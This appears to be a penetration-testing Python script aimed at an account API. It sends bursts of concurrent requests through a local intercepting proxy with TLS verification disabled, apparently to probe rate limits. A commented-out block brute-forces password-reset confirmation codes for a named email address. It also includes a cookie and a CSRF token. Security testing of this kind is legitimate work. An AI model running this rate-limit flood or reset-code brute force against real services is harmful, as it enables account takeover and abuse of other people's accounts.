import requests
from concurrent.futures import ThreadPoolExecutor


host="https://api-prod.example.com"
endpoint="/v1/accounts"
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

headers = {
    'Content-Type': 'application/json', 
    'User-Agent' : 'gui-api',
    'Content-Type' : 'application/json;charset=utf-8',
    "Sec-WebSocket-Version": "13",
    "Origin": "https://exchange.bitcoin.com",
    "Referrer": "https://exchange.bitcoin.com",
    "Sec-WebSocket-Extensions": "permessage-deflate",
    "Sec-WebSocket-Key": "fqezjH2YIZTpdw1btKsvjQ==",
    "Connection": "keep-alive, Upgrade"
    #"Cookie": "fbp=fb.1.1649251796260.899218244; csrftoken=20f947316d754a0aad16ae0f3bea8e9d",
    #"Sec-Fetch-Dest": "websocket",
    #"Sec-Fetch-Mode": "websocket",
    #"Sec-Fetch-Site": "same-site",
    #"Pragma": "no-cache",
    #"Cache-Control": "no-cache",
    #"Upgrade": "websocket"
}

i = 1
x = 0
while i <= 5:
  i += 1
  def get_url(url):
      return requests.get(url, proxies=proxies, verify=False )
  list_of_urls = [host+endpoint]*10
  with ThreadPoolExecutor(max_workers=10) as pool:
      response_list = list(pool.map(get_url,list_of_urls))
  for response in response_list:
      x += 1
      print(response.status_code, end=" ")
      print(x)

"""""
code=100000
body = {
  "confirmType":"EMAIL",
  "emailType":"FORGOT_PWD",
  "confirmValue":"rob.morel+12@coinflex.com",
  "confirmCode":code
  }


x = range(180359, 180399)
for n in x:
  body["confirmCode"] = n
  requests.post(host+endpoint, headers=headers, proxies=proxies, verify=False, data='{"confirmType":"EMAIL","emailType":"FORGOT_PWD","confirmValue":"rob.morel+12@coinflex.com","confirmCode":"123456"}' )
"""""